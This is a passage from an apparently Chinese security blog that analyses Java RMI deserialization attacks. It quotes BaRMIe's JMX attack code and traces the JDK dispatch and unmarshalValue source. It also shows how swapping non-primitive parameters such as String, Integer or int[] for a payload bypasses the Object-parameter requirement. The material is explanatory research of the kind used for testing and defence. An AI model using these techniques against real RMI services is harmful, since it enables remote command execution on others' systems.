title="RMI客户端反序列化攻击RMI服务端"></a>RMI客户端反序列化攻击RMI服务端</h2><p>那么再看之前的工具中的第二类攻击形式——RMI客户端反序列化攻击RMI服务端</p><h3 id="利用Object类型参数"><a href="#利用Object类型参数" class="headerlink" title="利用Object类型参数"></a>利用Object类型参数</h3><p>3个攻击模块都是利用有Object类型参数的接口，来传入Object类型的payload，在RMI服务端对Object类型的参数进行反序列化时，触发payload来完成反序列化攻击的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Java</span><br><span class="line">-JmxDeser</span><br><span class="line">SpringFramework</span><br><span class="line">-RmiInvocationHandlerDeser</span><br><span class="line">-Spring2RmilnvocationHandlerDeser</span><br></pre></td></tr></table></figure><p>这三个攻击模块同样是针对特定的组件提供的RMI服务，在判断是否存在漏洞时，代码会去判断RMI服务返回的对象的class栈是否存在以下class路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">javax.management.remote.rmi.RMIServerImpl_Stub</span><br><span class="line">javax.management.remote.rmi.RMIServer</span><br><span class="line">org.springframework.remoting.rmi.RmiInvocationWrapper_Stub</span><br><span class="line">org.springframework.remoting.rmi.RmiInvocationHandler</span><br></pre></td></tr></table></figure><p><strong>利用Object类型参数</strong>跟探测利用开放的RMI服务一样，也是假如对面自实现了RMI服务，我们没有接口的话就两眼摸黑，无法下手。</p><p>还是继续看看BaRMIe是怎么攻击的，以Spring RMI服务为例。</p><p>描述：Spring RMI Remoting使用invoke（）方法公开一个远程类，该方法接受一个RemoteInvocation对象作为参数。RemoteInvocation对象有一个可以保存任何对象的属性，从而启用反序列化攻击。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//nb.barmie.modes.attack.attacks.Java.JMXDeser#executeAttack</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">executeAttack</span><span class="params">(RMIEndpoint ep, DeserPayload payload, String cmd)</span> <span class="keyword">throws</span> BaRMIeException </span>&#123;</span><br><span class="line">RMIServer obj;</span><br><span class="line">    <span class="comment">//eq是RMI服务</span></span><br><span class="line"><span class="comment">//payload是选取的payload种类</span></span><br><span class="line">    <span class="comment">//cmd是我们要在目标执行的命令</span></span><br><span class="line"><span class="comment">//开始攻击</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//建立代理rmi服务，等会我们去看看内部做了什么</span></span><br><span class="line">System.out.println(<span class="string">"\n[~] Getting proxied jmxrmi object..."</span>);</span><br><span class="line">obj = (RMIServer)<span class="keyword">this</span>.getProxiedObject(ep, <span class="string">"jmxrmi"</span>, payload.getBytes(cmd, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用newClient()方法,传入一个固定默认的object</span></span><br><span class="line">System.out.println(<span class="string">"[+] Retrieved, invoking newClient(PAYLOAD)..."</span>);</span><br><span class="line">obj.newClient(<span class="keyword">this</span>.DEFAULT_MARKER_OBJECT);</span><br><span class="line">&#125; <span class="keyword">catch</span>(Exception ex) &#123;</span><br><span class="line"><span class="comment">//Check the exception for useful info</span></span><br><span class="line"><span class="keyword">this</span>.checkDeserException(ex);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进this.getProxiedObject</p><p><code>nb.barmie.modes.attack.RMIDeserAttack#getProxiedObject(nb.barmie.modes.enumeration.RMIEndpoint, java.lang.String, byte[])</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> Object <span class="title">getProxiedObject</span><span class="params">(RMIEndpoint ep, String name, <span class="keyword">byte</span>[] payload)</span> <span class="keyword">throws</span> BaRMIeException </span>&#123;</span><br><span class="line">    <span class="comment">//需要注意此处的this.DEFAULT_MARKER_OBJECT_BYTES</span></span><br><span class="line">    <span class="comment">//与obj.newClient(this.DEFAULT_MARKER_OBJECT)中的内容一致，等同于一个占位符的感觉</span></span><br><span class="line">    <span class="comment">//这边是从ep（rmi服务端）端中获取了名字为name的对象，做代理</span></span><br><span class="line">    <span class="comment">//同时在代理之后所有的通讯的同时，会将this.DEFAULT_MARKER_OBJECT_BYTES替换为payload</span></span><br><span class="line">    <span class="comment">//从而实现不同的payload的动态注入</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getProxiedObject(ep, name, payload, <span class="keyword">this</span>.DEFAULT_MARKER_OBJECT_BYTES);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到实际利用就是直接去服务端lookup获取这个<strong>jmxrmi</strong>对象，获取到了就调用<strong>newClient(Object a)</strong>这个方法，然后用自己的payload替换这个a就可以了。</p><p>与我们预想中的一样，也不是啥rmi服务都能打的。如果不知道对面接口、参数，对方那又不存在自己已知的用Object参数的rmi服务接口（class判断），就直接GG。</p><p>同样局限很大，但是相对于探测利用开放的RMI服务，这个稍微要求低点，不要求对方功能有害，只要有一个已知有Object参数的方法接口就行。但是，这里作为一个反序列化点，要利用，还需要服务器有利用链才行。</p><h4 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h4><p>我们之前默认了这个Object参数肯定会在服务端反序列化，虽然事实也是如此，但是我们来看一下到底在服务端是如何反序列化的。这将对我们接下来的漏洞理解有帮助，毕竟之后都是看源码。</p><blockquote><p>github：RMI-Client Client 攻击 RMI-Server ServerAndRegister 【没用BaRMIe打是因为，那边的环境比较复杂，自己写个参数简单点】</p><p> jdk:1.7u80【这边使用的CC payload是1.7下的】</p><p>反序列化链：cc3.2.1</p></blockquote><p>服务端在下面的dispatch方法中下断点，开启调试，客户端直接运行攻击服务端，就会到断点处</p><p><code>rt.jar.sun.rmi.server.UnicastServerRef#dispatch</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dispatch</span><span class="params">(Remote var1, RemoteCall var2)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">long</span> var4;</span><br><span class="line">        ObjectInput var40;</span><br><span class="line">        <span class="comment">//---------第一个try--------</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var40 = var2.getInputStream();</span><br><span class="line">            <span class="keyword">int</span> var3 = var40.readInt();</span><br><span class="line">            <span class="keyword">if</span> (var3 &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//在正式接受参数前解析前，会进入几次这个if函数，虽然不知道干了啥，估计是一些固定通讯</span></span><br><span class="line">                <span class="comment">//但是在接受参数，进行解析执行参数的dispatch，不会进入这个if</span></span><br><span class="line">                <span class="comment">//所以第一个try这里其实没做什么，就在下main读取了一个Method hash</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.skel != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.oldDispatch(var1, var2, var3);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"skeleton class not found but required for client version"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">   <span class="comment">//var4是从客户端传输过来的序列化数据中读取客户端调用的Method hash</span></span><br><span class="line">            var4 = var40.readLong();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var36) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling call header"</span>, var36);</span><br><span class="line">        &#125;</span><br><span class="line">   <span class="comment">//--------第一个try结束---------</span></span><br><span class="line">        MarshalInputStream var39 = (MarshalInputStream)var40;</span><br><span class="line">        var39.skipDefaultResolveClass();</span><br><span class="line">        <span class="comment">//通过客户端提供的var4去验证客户端想要调用的方法，在这里有没有</span></span><br><span class="line">        Method var8 = (Method)<span class="keyword">this</span>.hashToMethod_Map.get(var4);</span><br><span class="line">        <span class="comment">//如果没有就报错你想调用的方法在这里不存在。</span></span><br><span class="line">        <span class="keyword">if</span> (var8 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"unrecognized method hash: method not supported by remote object"</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>来看看这边服务端的hashToMethod_Map长啥样，就是我们在服务端实现的RMI服务对象的三个方法。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16s5z34uj31hh04pgmn.jpg" alt="hashToMethod_Map.png"></p><p><strong>之前开过一个脑洞</strong>：</p><p>正常而言是服务端什么接口，客户端就用什么接口，比如<code>name(java.lang.String)</code></p><p>如果我们在客户端强行把<code>name(java.lang.String)</code>的方法接口写成<code>name(java.lang.Object)</code>（因为在客户端，RMI接口类是客户端自己写的，如果把name参数故意写成Object，在客户端调用是不会报错的），尝试无中生有一个Object来让服务端解析，如果这样成功的话，就可以这样是不是就扩大了攻击面了，不是Object的参数就创造一个Object参数出来，让服务端解析？</p><p>但是实际上看过源码我们也会发现，会卡死在上面method hash验证这一步的，会报错：<strong>unrecognized method hash</strong></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16sdbtxjj31ic125tdv.jpg" alt="没有对象的地方强行用对象.png"></p><p>虽然我们知道不行，还是看看具体数据包，打开wireshark，抓个RMI客户端发送参数给RMI服务端的数据包（关于抓包交互流程啥的参考上一篇RMI 反序列化吧，个人是抓的Npcap网卡，无线网卡抓不到本地交互包）：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16sla9atj31ev0rm77c.jpg" alt="方法hash1数据包.png"></p><p>导出为16进制字符串，把aced反序列化开头前的不要，给serializationdumper分析一下，图中框起来的就是我们客户端传输的method hash</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16sqaqwrj31uz0h1jxf.jpg" alt="方法hash1.png"></p><p>对比下服务端分析处的：（服务端调试时，显示的是10进制Long型，写个小DEMO，我们把它调为16进制来对比下）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16svigjdj31el12fdl0.jpg" alt="方法hash1断点.png"></p><p>跟我们wireshark获取的完全一致（当然了….）但是这个Method hash，与上面服务端自己实现的method hash map中的值均不符，于是，强行把<code>name(java.lang.String)</code>的方法接口写成<code>name(java.lang.Object)</code>来无中生有一个Object，会因为服务端没有我们传输过去的method hash而失败。</p><p>啊噢，脑洞失败。</p><p>但是<strong>第二个脑洞</strong>：我们既然都抓到数据包了，反正理论上我们客户端生成的数据包我们可以随意控制，我们可以在method hash的位置正常写一个服务端有的method hash，就可以通过method hash校验了。但是然后传输的参数继续写成Object形式这样可以么？</p><p>继续看源码，顺路看看判断这个脑洞可以不，<code>sun.rmi.server.UnicastServerRef#dispatch</code>紧接着上面method hash判定</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.logCall(var1, var8);</span><br><span class="line"><span class="comment">//var8 是在hashToMethod_Map中用客户端传输过来的method hash查询到的RMI服务端实现的Method类型</span></span><br><span class="line"><span class="comment">//获取Method中的入参</span></span><br><span class="line">Class[] var9 = var8.getParameterTypes();</span><br><span class="line"><span class="comment">//获取入参个数，等会拿来存储反序列化结果</span></span><br><span class="line">Object[] var10 = <span class="keyword">new</span> Object[var9.length];</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//这边是JDK提供给开发者自定义的解析部分，默认是一个空函数</span></span><br><span class="line">    <span class="keyword">this</span>.unmarshalCustomCallData(var40);</span><br><span class="line"><span class="comment">//遍历入参类型</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> var11 = <span class="number">0</span>; var11 &lt; var9.length; ++var11) &#123;</span><br><span class="line">        <span class="comment">//**关键函数**：unmarshaValue(入参类型，传输数据包)</span></span><br><span class="line">        <span class="comment">//这里开始根据 入参类型（var9[var11]） 反序列化 传输过来的序列化入参，然后反序列化结果给var10</span></span><br><span class="line">        var10[var11] = unmarshalValue(var9[var11], var40);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException var33) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling arguments"</span>, var33);</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException var34) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling arguments"</span>, var34);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    var2.releaseInputStream();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面说到第二个脑洞：关注<strong>unmarshalValue(var9[var11], var40);</strong></p><ul><li>这里我们客户端传输的Object类型恶意参数在var40中</li><li>入参类型（var9[var11]）是服务器本地RMI服务Method的设定参数类型</li></ul><p>这里的处理是没问题的，用本地的Method设定的参数类型去读取客户端提供的输入流。</p><p>继续跟进<code>sun.rmi.server.UnicastRef#unmarshalValue</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">static</span> Object <span class="title">unmarshalValue</span><span class="params">(Class&lt;?&gt; var0, ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">//var0 是服务端Method设定的入参参数类型</span></span><br><span class="line">    <span class="comment">//var1 是传输从客户端来的的序列化数据流</span></span><br><span class="line">    <span class="comment">//var0.isPrimitive 判断是否是默认基础类型</span></span><br><span class="line">    <span class="comment">//需要注意基础类型!=下面这些TYPE，我们在之后解释这个坑</span></span><br><span class="line">    <span class="keyword">if</span> (var0.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (var0 == Integer.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readInt();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Boolean.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readBoolean();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Byte.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readByte();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Character.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readChar();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Short.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readShort();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Long.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readLong();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Float.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readFloat();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Double.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readDouble();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">"Unrecognized primitive type: "</span> + var0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//将从客户端传输过来的序列化数据流进行readObject</span></span><br><span class="line">        <span class="comment">//**反序列化执行处**</span></span><br><span class="line">        <span class="keyword">return</span> var1.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<code>var1.readObject();</code>就是<strong>反序列化</strong>我们的Object payload参数的地方。</p><p>到这里我们利用Object的类型参数传输payload的漏洞触发点就跟完了，主要就以下步骤</p><ol><li>根据传输过来的Method hash，判断本地提供的RMI服务类的方法是否有这个Method hash</li><li>根据Method hash取到Method类，遍历入参，从输入流按顺序反序列化入参</li><li>当服务端设定的RMI方法的入参<strong>不是基础数据类型</strong>时，执行<code>var1.readObject</code>就会触发我们的payload</li></ol><h3 id="绕过Object类型参数"><a href="#绕过Object类型参数" class="headerlink" title="绕过Object类型参数"></a>绕过Object类型参数</h3><p>上面我们也在一直开脑洞，想要扩大影响范围，但一路分析下来好像看似没什么办法。但是好像有一个地方可以注意到：当服务端设定的RMI方法的入参<strong>不是基础数据类型</strong>时，就会执行反序列化输入流。这里并不强求是要Object类型的参数才能<code>var1.readObject</code>。</p><p>这里看似没问题，但是你细品：</p><p>假如服务端的RMI方法接口的入参是<code>name(java.lang.String)</code>（<strong>String不在基础数据类型表中</strong>）；那么它就会进入else分支，执行<code>var1.readObject();</code>，但是<code>var1</code>又是我们客户端输出的值，假如我们输入的<strong>不是一个<code>java.lang.String</code>的值</strong>，而是一个<strong>Object对象</strong>，那么实际上也会被反序列化解析，即<code>Object.readObject();</code>完成任意命令执行。</p><p>那么：<strong>RMI服务端需要起一个具有Object参数的RMI方法</strong> 的利用条件限制 就扩展到了 <strong>RMI服务端只需要起一个具有不属于基础数据类型参数的RMI方法</strong>（比如String啥的）</p><p><strong>攻击原理核心</strong>在于替换原本不是Object类型的参数变为Object类型。之前我们修改String接口变为Object，是可以做到修改参数类型，但是那样还会修改method hash。所以这里只能修改底层代码，去替换原本的参数为我们想要的payload。</p><p>afanti总结了以下途径（后发现是<a href="https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/" target="_blank" rel="noopener">国外老哥</a>先提出来的）：</p><ol><li>直接修改rmi底层源码</li><li>在运行时，添加调试器hook客户端，然后替换</li><li>在客户端使用Javassist工具更改字节码</li><li>使用代理，来替换已经序列化的对象中的参数信息</li></ol><p>途径不同，目的都是一样的，我们使用afanti的<a href="https://github.com/Afant1/RemoteObjectInvocationHandler" target="_blank" rel="noopener">RemoteObjectInvocationHandler</a>来试验下可行性。</p><p>RMI服务端改成提供一个String参数为接口的方法：<code>say(String say)</code></p><p>修改<code>afanti.rasp.visitor.RemoteObjectInvocationHandlerHookVisitor.RemoteObjectInvocationHandlerHookVisitorAdapter#onMethodEnter</code>下的DNS地址为自己的，然后打包成jar。</p><p>设置VM options</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16tc3gg4j31g80o1di8.jpg" alt="vm options配置.png"></p><p>Server调试一下，断点下在入参判断处，然后客户端直接运行。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16thrig4j31j80r7wg7.jpg" alt="String调试.png"></p><p>可以看到入参类型为String，但是var1中是Object类型的URLDNS payload</p><p>到URLDNS的触发末端下个断点看看<code>java.net.URLStreamHandler#hashCode</code>，已经执行到这了，证明OK。（其实是由于再写文章的时候CEYE莫名其妙挂了，就不补图惹，不了解URLDNS原理的可以看<a href="https://www.anquanke.com/post/id/201762#h3-7" target="_blank" rel="noopener">这里</a>）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16tmsyclj31ci0ps405.jpg" alt="URLDNS.png"></p><p>其实我们回看<a href="https://github.com/NickstaDB/BaRMIe" target="_blank" rel="noopener">BaRMIe</a>，会发现在其README.md文档中已经对于该类型绕过进行了说明（可能这就是大佬吧.jpg）：</p><blockquote><p>3.通过非法的方法调用进行反序列化攻击</p><p>由于在服务器上对于客户端传入参数序列化的同时对于方法的参数并没有进行匹配检查。我们可以使用具有非原始参数类型的任何方法作为反序列化攻击的入口点。BaRMIe通过使用TCP代理在网络级别修改方法参数来实现这一点，实际上触发了非法的方法调用。下面是一些易受攻击方法的示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>;</span><br><span class="line">&gt; <span class="function"><span class="keyword">public</span> Long <span class="title">add</span><span class="params">(Integer i1, Integer i2)</span></span>;</span><br><span class="line">&gt; <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span>[] values)</span></span>; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>当方法调用通过代理时，这些方法的参数可以替换为反序列化负载。此攻击是可能的，因为Java在反序列化之前不会尝试验证通过网络接收的远程方法参数是否与实际参数类型兼容。</p></blockquote><p>这里提到<strong>Integer参数</strong>也是可以利用的，但是想想不科学呀，Integer不是在if为true的情况下么？我们回看下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (var0.isPrimitive()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (var0 == Integer.TYPE) &#123;<span class="comment">//这里</span></span><br><span class="line">        <span class="keyword">return</span> var1.readInt();</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>查一下<a href="http://www.51gjie.com/java/778.html" target="_blank" rel="noopener">isPrimitive()</a>是判断是否为基本类，包括基本类型boolean、char、byte、short、int、long、float、double。而Integer是int的封装类，不是一个基本类，所以Interger的参数也可以？</p><p>试一试：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16tuhpwfj31200gjq42.jpg" alt="Integer调试.png"></p><p>还真的会到else中……</p><p>这里有一个非常坑的烟雾弹，那就是下面的<strong>Integer.TYPE</strong>，真的会很自然的以为Integer.TYPE就是Integer类，那么包括integer类下面的这些类都不行，而实际上<strong>Integer.TYPE</strong>不是Integer类是基础类<strong>int</strong>！！！！！</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16tzrpjcj315d0cvq3x.jpg" alt="Integer-int.png"></p><p>那么我们也就可以理解为啥<strong>参数为Integer</strong>是可以的了，因为Integer  !=i nt，不是基础类。</p><p>再顺手来验证下<strong>int[]</strong>吧</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16u5qw2ej31370jl3zu.jpg" alt="int[]调试.png"></p><p>也进入else，数组的class竟然长这样 因垂丝汀。最后看一个不行的int类型：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16uaiz26j30om0m4jt1.jpg" alt="int调试.png"></p><blockquote><p>这里截图是去掉替换成payload的jar包看到的结果，替换成payload后其实不到这里就会报错退出，没有细究应该是payload的问题。</p></blockquote><p>那么至此我们也就知道：<strong>假如服务端起一个RMI服务，只要提供了非基础类的参数接口，我们都可以对其进行反序列化攻击。</strong></p><p>在相关文章中总结的：</p><ul><li>Bypass JEP290攻击rmi的 <strong>即使暴露的函数非Object参数类型的，也是可以被攻击的。</strong></li><li>RMI漏洞的另一种利用方式的 <strong>如果暴露的函数无Object类型参数，那么就需要动态替换rmi通讯时候函数参数的值</strong></li></ul><p>感觉都会有些误导说让人迷糊的觉得所有参数都可以，可能是因为这个太简单了？？</p><p>回到Barmie工具，它虽然提出了这个绕过Object调用的利用方式，但是是没有为其提供攻击模块。</p><p>想想也正常，这个绕过其实在实际场景中也同样有一个鸡肋的前提，客户端要知道服务端起服务的接口以及调用方式，即a.b(c)。</p><p>实际利用还是太难了。</p><h2 id="RMI服务端反序列化攻击RMI注册端"><a href="#RMI服务端反序列化攻击RMI注册端" class="headerlink" title="RMI服务端反序列化攻击RMI注册端"></a>RMI服务端反序列化攻击RMI注册端</h2><p>上边讲述的三类攻击方式，讨论的人挺少，因为在实际中确实挺鸡肋的，但是搞搞清楚也算有趣。</p><p>接下来就是比较通用的攻击情景了：攻击者模拟RMI服务端攻击RMI注册端</p><p>我们先来看看RMI服务端的漏洞触发点代码：<code>/rt.jar!/sun/rmi/server/UnicastServerRef.class#RegistryImpl_Skel</code></p><blockquote><p>环境：RMI-Server ServerAndRegister 分析</p><p>jdk:1.7u80</p><p>jdk7u80版本这个地方在调试<code>RegistryImpl_Skel.class</code>这个神奇的文件的时候有一个非常有趣而坑爹的情况，那就是这个class压根没法调试。百思不得其解，去下了openjdk 的jdk源码，发现源码中根本没有这个<code>RegistryImpl_Skel.java</code>文件。</p><p>跟wh1tp1g讨论了下，应该是一个动态生成的class，所以不能调试。然后非常神奇在jdk8版本的8u112也不能调试，但是8u141之后又可以了。如果有想自己调试的同学可以注意下这个点。</p></blockquote><p><code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>（我们可以叫做RMI注册任务分发处，就是注册端处理请求的地方）其实是从<code>sun.rmi.server.UnicastServerRef#dispatch</code>（RMI请求分发处）那边过来的。</p><p>由于RegistryImpl_Skel不能下断点，我们在bind函数执行处<code>sun.rmi.registry.RegistryImpl#bind</code>下一个断点，直接运行，就可以得到调用栈，再回去找就好了。</p><p><code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="keyword">int</span> var3, <span class="keyword">long</span> var4)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//一处接口hash验证</span></span><br><span class="line">    <span class="keyword">if</span> (var4 != <span class="number">4905912898345647071L</span>) &#123;</span><br><span class="line">            <span 